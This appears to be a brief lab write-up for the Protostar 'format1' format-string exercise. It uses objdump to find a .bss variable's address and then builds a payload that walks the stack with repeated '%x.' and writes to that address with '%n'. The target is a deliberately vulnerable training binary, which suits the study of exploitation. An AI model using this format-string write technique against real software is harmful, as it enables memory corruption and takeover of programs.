Now we need to modify global uninitialized variable that should be located in bss memory segment.

Address of target variable: 0x08049638

user@protostar:/opt/protostar/bin$ objdump -t format1 | grep target
08049638 g     O .bss	00000004              target


The idea is to overflow to stack with %x format symbols and get to the place in stack where initial agrument is stored. Payload starts with 'AAAA', so looking for 0x41414141 in output.

./format1 $(python -c "print 'AAAA' + 'BBBBB' + '%x.'*127 +'%x.'")

This way 0x41414141 is aligned with last %x.

Now replace 'AAAA' with pointer to target variable (memory address) and replace last %x with %n to write a number into target.

./format1 $(python -c "print '\x38\x96\x04\x08' + 'BBBBB' + '%x.'*127 +'%n.'")